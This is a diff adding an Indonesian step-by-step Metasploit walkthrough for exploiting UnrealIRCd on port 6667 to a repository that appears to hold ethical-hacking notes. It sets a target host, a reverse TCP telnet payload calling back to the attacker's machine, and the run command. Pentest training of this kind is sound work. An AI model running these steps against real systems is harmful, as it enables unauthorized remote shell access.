@@ -461,6 +461,33 @@ Berikut cara mengeksploit Windows 7 dengan `EternalBlue`:
 13. dan untuk menjalankannya gunakan perintah `run`.
   - <img width="450" alt="Screenshot 2023-12-23 at 15 24 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/5deae0fd-351f-4434-af8c-856e131acb6d">
 
+<br>
+================================================================================================
+
+## STEP BY STEP EXPLOITATION `UnrealIRCd` 
+
+Port 6667 adalah port yang umumnya digunakan untuk layanan Internet Relay Chat (IRC), yang digunakan untuk berkomunikasi dalam real-time melalui berbagai saluran (channels) di internet. IRC adalah protokol komunikasi yang sudah lama ada dan umumnya digunakan untuk obrolan grup dan diskusi topik tertentu.
+
+  - Eksploitasi Kerentanan Keamanan:
+      - Jika ada kerentanan keamanan yang ditemukan dalam versi tertentu dari UnrealIRCd, penyerang dapat mencoba menggunakan exploit untuk mendapatkan akses yang tidak sah ke server
+  - <img width="399" alt="Screenshot 2023-12-24 at 12 35 51" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/0acf7b1e-b958-457a-9e8d-95169f74997c">
+
+1. terlebih dahulu cari exploit mana yang akan kita gunakan, yaitu gunakan perintah `searchsploit unrealircd`.
+  - <img width="728" alt="Screenshot 2023-12-24 at 12 40 45" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/218586ed-27d5-4da2-91ba-8aa2f9547f54">
+2. dan dsini kita akan gunakan exploit dari modul metasploit framework.
+3. untuk membuka metasploit gunakan perintah `msfconsole`.
+4. cari exploit `UnrealIRCd`, gunakan perintah `search unrealircd`.
+  - <img width="450" alt="Screenshot 2023-12-24 at 12 45 41" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/35a6fe2f-ed86-4285-9a09-46565373ceb1">
+5. gunakan exploit tersebut, gunakan perintah `use 0`.
+6. untuk melihat optionsnya gunakan perintah `show options`.
+7. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
+8. untuk mengisi `payloads` (jika dibutuhkan), gunakan perintah `show payloads`.
+  - <img width="450" alt="Screenshot 2023-12-24 at 12 51 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6c765752-e6da-474f-8adc-cb559d319deb">
+9. gunakan payloads `Reverse TCP (Telnet)`, gunakan perintah `set payload 5`.
+    - catatan: jika kita mengunakan payload `Reverse TCP (Telnet)` kita harus mengisi `LHOST` yaitu ip address dari Kali Linux kita.
+10. untuk mengisi LHOST gunakan perintah `set LHOST ip_addres`.
+11. dan untuk menjalankannya gunakan perintah `run`.
+
 
 
 
